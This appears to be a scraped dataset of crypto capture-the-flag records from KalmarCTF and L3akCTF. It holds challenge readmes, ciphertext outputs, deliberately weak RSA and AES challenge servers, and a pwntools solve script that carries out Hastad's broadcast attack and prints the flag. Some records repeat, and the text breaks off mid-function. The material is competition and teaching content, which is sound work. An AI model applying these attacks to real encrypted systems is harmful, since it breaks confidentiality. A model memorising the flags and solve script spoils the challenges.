{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "RSA", "writeup": "Challenge written by Lance, some testing by killerdog\n\nChallenge name: Reconstruction\nCategory: Crypto\nNumber of solves: 22\n\nCTFd_description:\n```\nShamir agreed to keep my flag secret for me in his stronghold. He assured me that the adversary would never cross its threshold. But the adversary commanded vast legions, and broke through to the threshold. There remains only one defense against reconstruction. Note: This challenge requires some extended computation. Our (very unoptimised) solve script terminates in under 30 minutes :)\n```\n\n\nInformation and files given to players are in /public\n\nThis challenge had no remote.", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\Reconstruction\\readme.txt", "file_size": 626, "scraped_at": "2025-10-26T18:19:59.432978"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "AES", "writeup": "Challenge written by https://github.com/rot256, some testing by killerdog\n\nChallenge name: Telepound\nCategory: Crypto\nNumber of solves: 3\n\nCTFd_description:\n```\nTelepound is our new proprietary zero-knowledge team collaboration SaaS solution designed by our crypto wizards here at Consolidated Kalmar International Telecommunications Solution Systems Limited. As the modes of the business village shift in this unprecedented era of Arbitrary Intelligence (AI) and Buckschains, so must our means of humanoid communication. To meet these new cyberdemands of the corporate-tomorrow, Telepound deploys custom proven Ameliorated Encipherment Stuff (AES) encryption at all your favorite security levels, required for the interoperable synergetic modes of modern business.\n\n`nc {Remote server IP and PORT here}`\n```\n\nInformation and files given to players are in /public\nFiles used to compile and host the challenge are in /internal_hosting\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\telepound\\readme.txt", "file_size": 934, "scraped_at": "2025-10-26T18:19:59.445325"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "Unknown", "writeup": "Challenge written by https://github.com/rot256\n\nChallenge name: Yoloproofs\nCategory: Crypto\nNumber of solves: 2\n\nCTFd_description:\n```\nZero-knowledge proofs are pretty dank bro, in early 90ties Goldwasser et al. showed that you prove every satisfied NP relation in ZK, in late 2010s blockchain people showed us this result extends to false NP instances. Cool stuff.\n\n`nc {Remote server IP and PORT here}`\n```\n\nInformation and files given to players are in /public\nFiles used to compile and host the challenge are in /internal_hosting\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\Yoloproofs\\readme.txt", "file_size": 534, "scraped_at": "2025-10-26T18:19:59.455720"}
{"id": "kalmar_kalmarctf_readme", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "readme", "attack_type": "Unknown", "writeup": "We have provided a docker setup to help you run/test this locally.\n\nJust run docker-compose up in this folder, then connect to the challenge on localhost via port 13337", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\telepound\\public_handout\\handout\\readme.txt", "file_size": 168, "scraped_at": "2025-10-26T18:19:59.502605"}
{"id": "kalmar_kalmarctf_output", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "output", "attack_type": "Unknown", "writeup": "9545542869340119550639205090013909714395988476475457249901740655620526312531414428857047063955357194802825068638655\n5589022840337548221166963371322821375589693655655249574837585507093828907485818255568490653609945453218699570772175\n3388775843423818784279960643710930025082943676220937703617669263355864471696923116904418584293241105666674675827331\n21046399552289475437934628953495768679484571750333451774563108808570821647231277761329866195732229310400522522540632\n14261111104412053135613913567537205690517365232360348623474760204427064696643400599661529983204982383594532997047931\n17131040719927460605572176300579286116910215051018566231683244922363435366794367986176102851421277327902779255608708\n19210940433763640127544854657502214442158782713519849879645551782159988501094669289942105142558821647518499760177770\n21876861003145965504691765331591645960772906554885762716894738921119595439832703034210970053652976799480989868162444\n26086331491768275424070144789417676038469510902912798678048656940643425624322250374207682709498248359100261382414853\n14767138100159695699826129334447912138561734955505122613934042776537747549298874497353808607912860563167756729840184\n14541442901119647896535296368697927703767481774522146076455256365486322720586522581152310181521202012516253215811603\n9511087113355491993088131667698390109748742292025215062849382410857932661274539635291569014185025992953231191615936\n37003043478807840983548038986379452652670789754915880324573852002342412488752586309556425790816854301236513037633668\n13590444303039790360484283324510579072926343623049205396817414605740239072707683622525658296078881324759594420480877\n32813057556443160936204933265602851380463078869143463496014066121506063770857205842654918071682805257623531032254634\n6749302913055691543070217434249139462621374494381112144169203274338304723852774080248145472842180289140328102121681\n10601470834602025029228244049738846162780864548925273373536848779914117553297508481221039784680927833183558121750293\n12434315408806013479210220323661065585758863410209085106624639461136124340717660931279914944282655965831237635967756\n24141049808245660125392926066622296385676401724486333053291676165591820663956228893485038879356823145311767100598614\n16593034040961582180489253295203537293997353761961368634667971036485307606471495685842331942322557568601557804655436\n33003345237849027438219357143937590601081168707003621587491729157590849339207328014242830194738907100822335216692954\n20321556492915847648156572252428374216431676237160757719812882907618645904503415954103741299284779666502451209677395\n32704533039613587752724655409293907560084402260788912539983780507648176455387282161541876220535024410241327790655387\n21775048423982589613255672368983913465697652161505936167310584717897393574045888315338622906944755226286692029295956\n15592360522384432861940548452495885762905859448791706359426677421909162597711343443760008615958487865370389215223953\n11546050380773877436747548673104551187181361272926300867011716629018037225818308999262469263362555419056769613448287\n18503160012194638234610266690675395405240078790171743975806712968643996763719923484097968143777714606565648704575186\n14975476440176184841271333686766691184735935462527200228079113075544535067636294856114125370710425330227861137643117\n14984661590525080880673701432949459406938014660095482258780567010768128731161066655726186373789699342531505521933929\n12958525080559355461189542456731161792478252611709263371927870625162616726247317994833868871991816840449720905732052\n26454794547514233109095214247652841003525187547293874240343774582099512476421165132469071314969996557185849259577418\n27106130251955548316997162117535888841341815072841805993944039284531019178163383375934345018697466741383491060266254\n13913749982464523076628682108679019270061896700281957656670465298398548198009086947576972758421924840146439680349438\n13513696015949801789784680788273715176235282806639137304950326035295025980721294928392814753737464059972357886662676\n30404281198414366029833867085513877375671840626942679252133563432315186435750453751307727299850309046520023777998044\n28748886640785551454222111399475089932937761237060059716066187960294058836682093377444729697437178791944729323272559\n17248805038959048059401403090965501870323090783097747994935742982420304959261386382025974457693466875638120503007929\n10522084689638535952647973951754751909303840836043252742540024237297043160289523353435192846348677247550896914388826\n7036591704863196228544246498628534157024966240581402191315162502533587378556984123716576756095567714205954948679710\n4853012385054932770027206279581799933883707635079450042336439542691392326754429743673626133915100083175712930588032\n22513910810313894113423619461344805062155242203428713839442472872997861014990650347826071726090969239947516506423354\n13267673179728024574986215252363456988306248229885701747146039201812671629173711517804354781412186184529242765067521\n144016606474916997346819476828456060041767839843514760232395439497624181366613870909168084227", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2023\\crypto\\Reconstruction\\public_handout\\handout\\output.txt", "file_size": 116740, "scraped_at": "2025-10-26T18:19:59.541076"}
{"id": "kalmar_kalmarctf_output", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "output", "attack_type": "AES", "writeup": "init = '4b2b8f015ac838013b2330496b'\nv = ['b19dd2', 'aa43fc', '2ff840', 'f944d4', 'e383bf', 'e8ff57', '2c3cad', '70bdad', 'cc8f65', '59a2c1', '51521b', 'b11505', '71bf95', '76bd04', '190e9e', '22a76c', '4f4b46', '0b0366', '6e5b74', '683d66', '0df575', '697683', '91a11f', '2c4a88', 'b40c52', '9fec93', '3ea23e', '64dab3', 'a66cca', 'ca0c19', 'd93c0a', '9fee90', 'fd1fb8', '4eeb7b', 'b0f7ed', 'f19fe4', '26d00e', 'f34a69', '1e988c', 'c25981', 'd9769d', '45c5f6', 'a1e567', 'e9a267', 'bad1bb', 'a93814', '76dfa1', 'd1654d', 'bee544', 'c4411e', 'b85110', 'fe920e', 'becb14', '3bc932', '932bac', '79b1a4', '5c4a1f', 'de129a', 'e4a860', '843b24', '0ea4e2', 'b8cfc0', '0e3430', 'f4b9b6', '1b4e1c', 'ba5b9b', '08265b', '864033', 'b608a8', '528292', 'b584de', 'f5a8d7', 'd1755e', 'da6933', 'dd4d1c', '535056', 'afdbf7', '851752', '88c665', '96767b', 'a08d9c', '32fba1', '0908c4', '89988f', '14d67f', 'ba2351', '8e61e8', '0dd35b', '4d9602', '9d856f', '243164', 'da0d61', 'ac1f97', '93b4b1', '48e574', '1d5541', 'c07b6a', 'ab87a2', 'dab5f2', '2696a5', '8131d0', 'af1274', 'e708a5', '86cc20', '27f6e5', '25561e', '184d0b', 'f4a48c', '7f42ae', '3669ec', 'cb2cd9', 'ca3bd7', 'c2ac38', 'd369c9', '3d11db', '0f46eb', 'd93f87', '8c55dc', '95f747', 'a75315', '852372', '84ffdb', '94d2c7', '9e3b85', 'c2bbad', 'dfb4e8', '311889', 'dcc5e6', '7eb10f', '59dffc', '1957a8', 'df10b3', 'ebfd25', 'fa1c6e', 'fe5802', '909042', 'aba5bf', 'db1403', 'acd4d7', '5ec9c6', 'e35e93', '0e0735', '77c6ca', '05a40e', 'b1b21b', '439f40', '6b5c30', '98e5c2', '1428df', '61726d', 'f6a253', '175142', 'd18960', 'ec8811', '5f1daa', '4c7d05', '92da84', '67c25c', '4967e9', '22c20e', 'ad68ef', '6523a7', '9dacd4', 'eb3b78', '4bf3dc', '020b44', '8bda25', 'f514ed', 'bc59b4', '59fba2', '9849c0', '547f6a', '4fa5f8', '6db1c8', '1ae1ba', '446db3', '1e9321', '2d966c', '93ade6', '8bc51b', '3a3e1a', '69c550', '8461c5', 'a1bc1c', '968377', '560eaa', 'e2f7be', '49e8cd', '3eaebc', '82729b', 'ed6bd4', '2d0b4f', '9ab070', '8e4610', '7545e9', '535e09', '6ed07d', '06a370', '2eb836', 'a4420d', 'c55236', 'fe9434', '44ed45', '4eb761', '193dbe', '8b8e4d', '1b1c78', 'fa05bb', 'f259d5', 'bcf9c7', '250f78', 'e3f928', '2e6c84', '34bab5', 'aacbf7', '837b84', '7b26be', '44693d', '2f1d0d', '106705', '3c9b72', 'f07768', '01bba5', 'ace1cf', '3344cc', 'a802bd', '77c9f8', '7da7ef', 'ebbf7d', '1cf462', 'b97592', '039f98', '6cdecf', '4a2c7b', 'bd8209', '2bfb88', '0bd392', '85a9be', 'c5c893', '1fc88e']\nflagenc = '4a1891d571e9f122afcc0203d0aeeda9e66bc125df5c883e84fd6eeef23ecefc4efeacd0a612'\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2024\\crypto\\PolyCG1305\\output.txt", "file_size": 2530, "scraped_at": "2025-10-26T18:19:59.655216"}
{"id": "kalmar_kalmarctf_output", "team": "kalmar", "repo": "kalmarctf", "challenge_name": "output", "attack_type": "Unknown", "writeup": "Alice's public key:\nO_A = (1/2 + 3139087966091527042724164371063030589339051004055967708170664892869345562111556348824225107517132393372689924522050655616406567328491765185222261961510689237267929279311609782357418840040524294659354641284484877569218388068290341759283720114793779176925526516557587289975027/10442377652832819173998733806230064520891239136345405981379819800234023363303*i + 134778440535064812863375326525680671757807663794802391672110044840763350292072954729998392344884999643549527453283432206206949877310069115342752466352262534906781232133028642392278182688574560907221/20884755305665638347997467612460129041782478272690811962759639600468046726606*j - 43091275557021159604726731850608138198864140730540333090865526303329247724069191896511275626434057338605046889855045314660749263796751941097612066423909406864013310272043155527235913423939886019838/10442377652832819173998733806230064520891239136345405981379819800234023363303*k, 1140050166384153598671053808284547083333475644918422714446369512375893132485731139381530742536969409980435300717930924487567999227211511890397400723353143612297986098621785381389526850709006473292510965784349596898721479168956408005354508087542657553124660679404528523394147/3632131357507067538782168280427848529005648395250575993523415582690095082888*i + 12237167707370108196751855640002138498871359778128385127343971890461132197963103634019583957229998371722761561279272832477175682729513124379137038511476773531976941499104527212077756891084578017347/1816065678753533769391084140213924264502824197625287996761707791345047541444*j - 15649837277307762048338384942381246456385650075794688800899813920966038887781526712987224027319619859505190442931210706648568209228305734906665114474845447426114000822316475055400707969769593552017/3632131357507067538782168280427848529005648395250575993523415582690095082888*k, 4429241630244300276185066527786269913437212951473229965283260188911425788848363746608152806469622279830925514744525062967808923806989910906708639109699465335604608711279984014352843493086295205003127663987102826790806271328621278051347060882884165397960688865140107314012565/20884755305665638347997467612460129041782478272690811962759639600468046726606*i + 47542971567359151521911567391320879216509420622472348763552232897282905068932744281590121946749907962261424394491984810076246355954014985885567031308645049327304980016730439679916878763205201495642/10442377652832819173998733806230064520891239136345405981379819800234023363303*j - 60801632085235350761850170487824977559767741405105260423755930057717334344947943793514775185333603661958839251880139112452159061760671463844149573783156854146273914037751930858094632342788046428243/20884755305665638347997467612460129041782478272690811962759639600468046726606*k, 8127110234121807894711590956465852443918991064750640867399399382565956459597861648688747623598907293659834183343677559497817345506977149834180408736343291613467108405966455115076831867075801973634290901150836683486067280944540088985787819576290951309741417201090241845887543/20884755305665638347997467612460129041782478272690811962759639600468046726606*i + 87235468967705661341463759134359792541298243172330042908557811943480445223140210448408270398135091681288103058791447396130703521356054129457185435043617485579476252116298202712361303925369359411579/10442377652832819173998733806230064520891239136345405981379819800234023363303*j - 111563470142849287657056756914607575235688821517056071939706175155599656551328823792530327320402625692461348307540042146190837993426336300546298691912480773309779327050420691250849021352971497651109/20884755305665638347997467612460129041782478272690811962759639600468046726606*k)\nomega_a = 1488266680223628278052716774800848920150209606085755664927315320253115807338197965423709338743416996320477970870328474909133893923744995072998902636306976821/41769510611331276695994935224920258083564956545381623925519279200936093453212*i + 4304923789650889416341506002435686012474185301440806830974435812227155920104535/20884755305665638347997467612460129041782478272690811962759639600468046726606*j - 5490522672141162020425974965469057837877682094875572736667326524671446445343519/41769510611331276695994935224920258083564956545381623925519279200936093453212*k\n\n\nBob's public key:\nO_B = (1/2 + 67603061877917546581014053870390865710887564229110733994469491179315205060761671275827761352541668356174918753277633081472855068939196239932598231859386010427583586314042165892363277979259312170043906630947975397848782463492363528871450903101980275840472273538544057925931898258254643488057466715/86345955631696964923541238482995069495782689860786497820890631303408038460012*i + 78108336144202612466091400357069784896451217830178095446188226510449722273978273674278009476782488056075516173227821938863643593266295390940531629582288493305734364132512097277710442607545490297105000512170039594526554/21586488907924241230885309620748767373945672465196624455222657825852009615003*j - 6690575935099184490", "solution_code": "", "tools": [], "file_path": "temp_repos\\kalmar_kalmarctf\\2024\\crypto\\shipwrecked_lattices\\output.txt", "file_size": 8944, "scraped_at": "2025-10-26T18:19:59.681773"}
{"id": "l3ak-team_L3akCTF-2024-public_Henny_on_the_Rocks", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "Henny on the Rocks", "attack_type": "Unknown", "writeup": "# Henny on the Rocks\n- **Author**: [supaaasuge](https://github.com/supaaasuge)\n- **Category**: Crypto\n- **Difficulty**: Hard \n## Description\nWhen life gives you biased nonces, put them on the rocks and drink them straight up. This challenge is like a stiff pour of cryptographic whiskey. No chaser.\n\n\n\n\n## Build the container\n```bash\ncd henny-on-the-rocks/build\ndocker build -t henny-on-the-rocks .\n```\n\n## Run the container\n```bash\ndocker run -p 7000:1337 -d henny-on-the-rocks .\n```\n\n\n### challenge - Served via socat\nThis version uses `socat` to serve the python script over a TCP connection on port `1337` \n\n\n##### backup version - SimpleThreadedTCP Server\n`/backup/`", "solution_code": "", "tools": ["python"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\crypto-on-the-rocks\\README.md", "file_size": 671, "scraped_at": "2025-10-26T18:20:13.857068"}
{"id": "l3ak-team_L3akCTF-2024-public_Paillien_Tourist", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "Paillien Tourist", "attack_type": "Unknown", "writeup": "# Paillien Tourist\n- **Author**: [supaaasuge](https://github.com/supaaasuge)\n- **Difficulty**: Easy\n- **Category**: Crypto\n\n## Description\nArmed with Pascal Paillier's Homomorphic Encryption scheme. Perform some simple math and get the flag.\n\n## Dist\n`chal.sage`\n`challenge.txt`\n\n## Build\nNothing... static challenge\n\n## Run\nNothing... static challenge", "solution_code": "", "tools": ["sage"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\paillien-tourist\\README.md", "file_size": 352, "scraped_at": "2025-10-26T18:20:13.873869"}
{"id": "l3ak-team_L3akCTF-2024-public_QuantumL3ak", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "QuantumL3ak", "attack_type": "Unknown", "writeup": "# QuantumL3ak\n**Author:** diracdelta\n**Difficulty:** Medium\n**Category:** Crypto\n\n## Description\nUntangle the secrets of the universe!\n\n## Flag format\nL3AK{}\n\n## Download\ndist.zip \n\n## Deployment\nDockerfile\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\QuantumL3ak\\README.md", "file_size": 207, "scraped_at": "2025-10-26T18:20:13.892028"}
{"id": "l3ak-team_L3akCTF-2024-public_Really_Simple_Algorithm", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "Really Simple Algorithm", "attack_type": "Unknown", "writeup": "# Really Simple Algorithm\n\n**Author:** Suvoni\n\n**Difficulty:** Baby\n\n**Category:** Crypto\n\n## Description\nLike I said, it's really simple!\n\n## Building/Deployment\nThis challenge has a Python server script that players need to connect to.\nI included a Dockerfile in build/ which spawns on a hardcoded port 43012, change it as needed.\n", "solution_code": "", "tools": ["python"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Really-Simple-Algorithm\\README.md", "file_size": 333, "scraped_at": "2025-10-26T18:20:13.909232"}
{"id": "l3ak-team_L3akCTF-2024-public_Related", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "Related", "attack_type": "RSA", "writeup": "# Related\n\n**Author:** S1mple\n\n**Difficulty:** Baby\n\n**Category:** Crypto\n\n## Description\nI encrypted my flag twice with RSA, so I added some random padding just to be safe! Surely there's nothing wrong with my method...right??\n\n## Building/Deployment\nNothing, just the attachments\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Related\\README.md", "file_size": 282, "scraped_at": "2025-10-26T18:20:13.927064"}
{"id": "l3ak-team_L3akCTF-2024-public_README", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "README", "attack_type": "RSA", "writeup": "You can use Hastad's Broadcast Attack to find the flag. To do this, we can simply get ``e = 1337`` pairs of ``(n_i,c_i)`` from the server, use the Chinese Remainder Theorem to find ``x``, then take the 1337th root to get the flag.\n\nhttps://en.wikipedia.org/wiki/Chinese_remainder_theorem\n\nhttps://docs.xanhacks.xyz/crypto/rsa/08-hastad-broadcast-attack/\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Really-Simple-Algorithm\\solution\\README.md", "file_size": 354, "scraped_at": "2025-10-26T18:20:13.950068"}
{"id": "l3ak-team_L3akCTF-2024-public_Henny_on_the_rocks_solution", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "Henny on the rocks solution", "attack_type": "Unknown", "writeup": "# Henny on the rocks solution\n\nRun the challenge PoC script:\n```bash\npython3 exploit.py <remote-host> <remote-port> <nsigs(Default: 100)>\n\npython exploit.py 172.17.0.2 1337 80\n```\n\nThe script will connect and receive $n$ signatures from the remote host then runs the attack defined in `utils.py` that solves the hidden number problem using an attack based on the shortest vector problem.\n- The hidden number problem is defined as finding y such that {xi = {aij * yj} + bi mod m}.\n\n\n... *To be continued*", "solution_code": "", "tools": ["python"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\crypto-on-the-rocks\\solution\\README.md", "file_size": 503, "scraped_at": "2025-10-26T18:20:13.969402"}
{"id": "l3ak-team_L3akCTF-2024-public_chal", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "chal", "attack_type": "Unknown", "writeup": "import random\nfrom flag import FLAG\nfrom Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes\n\np = getPrime(1024)\nq = getPrime(1024)\nn = p * q\ne = 0x101\n\ndef pad(flag):\n    m = bytes_to_long(flag)\n    a = random.randint(2, n)\n    b = random.randint(2, n)\n    return (a, b), a*m+b\n\ndef encrypt(flag):\n    padded_variables, padded_message = pad(flag)\n    encrypted = pow(padded_message, e, n)\n    return padded_variables, encrypted\n\nvariables, ct1 = encrypt(FLAG)\na1 = variables[0]\nb1 = variables[1]\n\nvariables, ct2 = encrypt(FLAG)\na2 = variables[0]\nb2 = variables[1]\n\nprint(f\"{n = }\")\nprint(f\"{a1 = }\")\nprint(f\"{b1 = }\")\nprint(f\"{ct1 = }\")\nprint(f\"{a2 = }\")\nprint(f\"{b2 = }\")\nprint(f\"{ct2 = }\")\n", "solution_code": "", "tools": ["pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Related\\dist\\chal.py", "file_size": 706, "scraped_at": "2025-10-26T18:20:13.997901"}
{"id": "l3ak-team_L3akCTF-2024-public_server", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "server", "attack_type": "RSA", "writeup": "from Crypto.Util.number import getPrime, bytes_to_long as btl\n\nmenu = '''(1) Encrypt Message\n(2) Receive Flag\n(3) Exit'''\n\ne = 1337\nsize = 1024\nflag = open('flag.txt', 'r').read().rstrip()\n\nprint('Welcome to the L3ak Really Simple Algorithm (RSA) Encryption Service™!')\nprint('Here you can encrypt your own message, or choose to receive the encrypted flag.')\nprint('Good luck!\\n')\n\nwhile True:\n\n    p, q = getPrime(size), getPrime(size)\n    n = p*q\n    print(menu)\n\n    option = int(input('Select Option: '))\n    if option == 1:\n        message = btl(input('Your Message: ').encode())\n        enc_msg = pow(message, e, n)\n        print(f'n = {n}')\n        print(f'c = {enc_msg}')\n    elif option == 2:\n        enc_flag = pow(btl(flag.encode()), e, n)\n        print(f'n = {n}')\n        print(f'flag = {enc_flag}')\n    elif option == 3:\n        print('Goodbye!')\n        exit()\n    else:\n        print('Invalid choice! Please try again.')\n\n", "solution_code": "    p, q = getPrime(size), getPrime(size)\n    n = p*q\n    print(menu)\n\n\n    option = int(input('Select Option: '))\n    if option == 1:\n        message = btl(input('Your Message: ').encode())\n        enc_msg = pow(message, e, n)\n        print(f'n = {n}')\n        print(f'c = {enc_msg}')\n    elif option == 2:\n        enc_flag = pow(btl(flag.encode()), e, n)\n        print(f'n = {n}')\n        print(f'flag = {enc_flag}')\n    elif option == 3:\n        print('Goodbye!')\n        exit()\n    else:\n        print('Invalid choice! Please try again.')\n", "tools": ["pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Really-Simple-Algorithm\\build\\server.py", "file_size": 938, "scraped_at": "2025-10-26T18:20:14.075376"}
{"id": "l3ak-team_L3akCTF-2024-public_server", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "server", "attack_type": "RSA", "writeup": "from Crypto.Util.number import getPrime, bytes_to_long as btl\n\nmenu = '''(1) Encrypt Message\n(2) Receive Flag\n(3) Exit'''\n\ne = 1337\nsize = 1024\nflag = open('flag.txt', 'r').read().rstrip()\n\nprint('Welcome to the L3ak Really Simple Algorithm (RSA) Encryption Service™!')\nprint('Here you can encrypt your own message, or choose to receive the encrypted flag.')\nprint('Good luck!\\n')\n\nwhile True:\n\n    p, q = getPrime(size), getPrime(size)\n    n = p*q\n    print(menu)\n\n    option = int(input('Select Option: '))\n    if option == 1:\n        message = btl(input('Your Message: ').encode())\n        enc_msg = pow(message, e, n)\n        print(f'n = {n}')\n        print(f'c = {enc_msg}')\n    elif option == 2:\n        enc_flag = pow(btl(flag.encode()), e, n)\n        print(f'n = {n}')\n        print(f'flag = {enc_flag}')\n    elif option == 3:\n        print('Goodbye!')\n        exit()\n    else:\n        print('Invalid choice! Please try again.')\n\n", "solution_code": "    p, q = getPrime(size), getPrime(size)\n    n = p*q\n    print(menu)\n\n\n    option = int(input('Select Option: '))\n    if option == 1:\n        message = btl(input('Your Message: ').encode())\n        enc_msg = pow(message, e, n)\n        print(f'n = {n}')\n        print(f'c = {enc_msg}')\n    elif option == 2:\n        enc_flag = pow(btl(flag.encode()), e, n)\n        print(f'n = {n}')\n        print(f'flag = {enc_flag}')\n    elif option == 3:\n        print('Goodbye!')\n        exit()\n    else:\n        print('Invalid choice! Please try again.')\n", "tools": ["pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Really-Simple-Algorithm\\dist\\server.py", "file_size": 938, "scraped_at": "2025-10-26T18:20:14.089123"}
{"id": "l3ak-team_L3akCTF-2024-public_Use_the_Chinese_Remainder_Theorem_to_compute_x=m^e", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "Use the Chinese Remainder Theorem to compute x=m^e", "attack_type": "Unknown", "writeup": "from pwn import *\nimport gmpy2\nfrom sage.all import *\nfrom Crypto.Util.number import long_to_bytes as ltb\n\ndef getMenu(r):\n    for _ in range(3):\n        line = r.recvline().rstrip().decode()\n    line = r.recvuntil(b': ').rstrip().decode()\n\nr = remote('localhost', 43012)\n\nfor _ in range(4):\n    line = r.recvline().rstrip().decode()\n    print(line)\n\ne = 1337\nc_list = []\nn_list = []\nfor i in range(int(e)):\n    print(i)\n    getMenu(r)\n    r.sendline(b'2')\n    line = r.recvline().rstrip().decode()\n    n = int(line.split(' ')[2])\n    n_list.append(n)\n    line = r.recvline().rstrip().decode()\n    c = int(line.split(' ')[2])\n    c_list.append(c)\nr.close()\n\n# Use the Chinese Remainder Theorem to compute x=m^e\nx = int(CRT_list(c_list, n_list))\nm = int(gmpy2.iroot(x, int(e))[0])\nflag = ltb(m).decode()\nprint(flag)\n\n# L3AK{H4sTAD5_bR0aDc45T_4TtacK_1s_pr3tTy_c0ol!}\n", "solution_code": "    line = r.recvline().rstrip().decode()\n    print(line)\n\n\n    print(i)\n    getMenu(r)\n    r.sendline(b'2')\n    line = r.recvline().rstrip().decode()\n    n = int(line.split(' ')[2])\n    n_list.append(n)\n    line = r.recvline().rstrip().decode()\n    c = int(line.split(' ')[2])\n    c_list.append(c)\n", "tools": ["sage", "pycryptodome", "gmpy2"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\Really-Simple-Algorithm\\solution\\sol.py", "file_size": 865, "scraped_at": "2025-10-26T18:20:14.117142"}
{"id": "l3ak-team_L3akCTF-2024-public_quantum", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "quantum", "attack_type": "AES", "writeup": "import os\nimport random\nimport json\n\nfrom collections import namedtuple\nfrom typing import Dict\nfrom qiskit import QuantumCircuit\nfrom qiskit_aer import StatevectorSimulator\nfrom qiskit_aer.backends.compatibility import Statevector\nfrom random import Random\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\nfrom enum import Enum\n\nAPI_CHOICE = Enum(\"API_CHOICE\", [\"UploadCircuit\", \"DisplayCircuit\", \"PerformMeasurement\", \"Exit\"])\nAPI = namedtuple(\"API\", [\"ShortDesc\", \"Action\"])\nAPI_MAX_REQUEST = 3200\nAPI_MENU : Dict[str, API] = {}\n\ndef build_api_menu(rng, statesim : StatevectorSimulator):\n    global API_MENU\n    API_MENU = {\n        API_CHOICE.UploadCircuit: API(\n            ShortDesc=\"Upload a circuit\",\n            Action=upload_circuit\n        ),\n        API_CHOICE.DisplayCircuit: API(\n            ShortDesc=\"Display the uploaded circuit\",\n            Action=display_circuit\n        ),\n        API_CHOICE.PerformMeasurement: API(\n            ShortDesc=\"Perform a measurement\",\n            Action=lambda: perform_measurement(rng, statesim)\n        ),\n        API_CHOICE.Exit: API(\n            ShortDesc=\"Exit\",\n            Action=None\n        )\n    }\n\nnoise_circuit : QuantumCircuit = None\nuploaded_circuit : QuantumCircuit = None\noutcomes = []\n\ndef generate_noise():\n    circuit = QuantumCircuit(8)\n    controls = random.sample(range(8), k = 4)\n    dependents = set(range(8)) - set(controls)\n    for c in controls:\n        circuit.h(c)\n        coupled = random.sample(list(dependents), k=1)\n        dependents -= set(coupled)\n        for cx in coupled:\n            circuit.cx(c, cx)\n    return circuit\n\ndef setup(rng):\n    global noise_circuit\n    noise_circuit = generate_noise()\n    build_api_menu(rng, StatevectorSimulator())\n\ndef display_menu(api_requests):\n    print(\"You may:\")\n    for i, (_, api) in enumerate(API_MENU.items(), 1):\n        print(f\"{i}. {api.ShortDesc}\")\n    print(f\"You have made {api_requests}/{API_MAX_REQUEST} requests\")\n\ndef print_encrypted_flag(rng : Random):\n    key = rng.getrandbits(128).to_bytes(16, byteorder='little')\n    iv  = rng.getrandbits(128).to_bytes(16, byteorder='little')\n    aes = AES.new(key, mode=AES.MODE_CBC, iv=iv)\n    with open(\"./flag.txt\", \"rb\") as flagfile:\n        flag = pad(flagfile.read(), 16)\n    ciphertext : bytes = aes.encrypt(flag)\n    print(\"Flag:\")\n    print(\"ct:\", ciphertext.hex())\n    print(\"iv:\", iv.hex())\n\ndef display_circuit():\n    if uploaded_circuit is not None:\n        print(uploaded_circuit.draw())\n    else:\n        print(\"No circuit has been uploaded\")\n\ndef upload_circuit():\n    global uploaded_circuit\n    try:\n        result = json.loads(input(\"Enter circuit json:\"))\n    except Exception:\n        print(\"invalid json\")\n        return\n\n    circuit = QuantumCircuit(8)\n    try:\n        for gate in result[\"gates\"]:\n            parse = gate.split(\" \")\n            if parse[0] == \"H\":\n                which = int(parse[1])\n                circuit.h(which)\n            elif parse[0] == \"CX\":\n                controller, controlled = int(parse[1]), int(parse[2])\n                circuit.cx(controller, controlled)\n    except Exception as e:\n        print(\"Input is invalid.\")\n        print(\"Expected input is of the form:\")\n        print('{\"gates\": [\"H 0\", \"CX 0 1\", \"H 3\"]}')\n        return\n    print(\"Circuit has been uploaded\")\n    print(circuit.draw())\n    uploaded_circuit = circuit\n\ndef perform_measurement(rng : Random, statesim : 